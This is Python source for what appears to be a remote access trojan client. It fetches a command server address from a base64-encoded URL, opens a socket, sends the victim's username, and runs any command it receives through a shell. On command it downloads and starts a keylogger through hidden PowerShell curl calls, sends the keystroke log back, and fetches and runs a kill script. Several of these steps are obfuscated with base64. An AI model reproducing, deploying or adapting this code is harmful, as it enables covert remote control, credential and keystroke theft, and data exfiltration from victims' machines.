import base64
import os
import socket
import subprocess as s
import sys
import time
import urllib.request

url = base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaWZuYXNlZi9SQVQvbWFpbi9pcC50eHQ=').decode()
server_address = urllib.request.urlopen(url).read().decode()
server_port = 8000
username = s.getoutput("""echo %username%""")
venom = False

while True:
    try:
        time.sleep(2)
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect(('192.168.1.9', server_port))
            time.sleep(1)
            client_socket.send(username.encode())
        except:
            client_socket.connect((server_address, server_port))
            time.sleep(1)
            client_socket.send(username.encode())

        while True:
            try:
                command = client_socket.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                if "start " in command or "curl " in command or "del " in command or "cd " in command:
                    os.system(command)
                    client_socket.send(b"done")
                if command == "keylog":
                    os.system(base64.b64decode(b'cG93ZXJzaGVsbCAtd2luZG93c3R5bGUgaGlkZGVuIGN1cmwg'
                                               b'aHR0cDovLzE5Mi4xNjguMS45OjkwMDAva2V5bG9nZ2VyLmV4ZSAt'
                                               b'b2t0IGtleWxvZ2dlci5leGU='))
                    os.system("start keylogger.exe")
                if command == "getlog":
                    cd = os.path.abspath(sys.argv[0])
                    cd = cd.rsplit("\\", 1)[0]
                    cd += "\\Logs\\keylog.txt"
                    data = ""
                    f = open(cd, 'r')
                    data += f.read()
                    f.close()
                    client_socket.send(data.encode())
                if "upload" in command:
                    path = command.split(" ")[1]
                    os.system(base64.b64decode(b'QzpcVXNlcnNcJXVzZXJzJUV4cGxvZGVcVHJhbnNwb3J0c1xNaWNy'
                                               b'b3NvZnRcVXBsb2Fkc1x1cGRvd25cIHVwbG9hZGluZy4gJWxpbmsgJ'
                                               b'XVzZXJuYW1lJUV4cGxvZGU=').decode() + path + " upload")
                    client_socket.send("uploading...".encode())
                if "download" in command:
                    path = command.split(" ")[1]
                    os.system(base64.b64decode(b'QzpcVXNlcnNcJXVzZXJzJUV4cGxvZGVcVHJhbnNwb3J0c1xNaWNy'
                                               b'b3NvZnRcVXBsb2Fkc1x1cGRvd25cIHVwbG9hZGluZy4gJWxpbmsgJ'
                                               b'XVzZXJuYW1lJUV4cGxvZGU=').decode() + path + " download")
                    client_socket.send("downloading...".encode())
                if command == "kill":
                    os.system(base64.b64decode(b'cG93ZXJzaGVsbCAtd2luZG93c3R5bGUgaGlkZGVuIGN1cmwgJG'
                                               b'FkZHJlc3M6OTAwMC9raWxsLmJhdCAtbyBraWxsLmJhdA=='))
                    os.system("start kill.bat")
                else:
                    try:
                        output = s.check_output(command, shell=True, universal_newlines=True)
                        client_socket.send(output.encode())
                    except:
                        client_socket.send("error\n".encode())
            except:
                break
    except:
        pass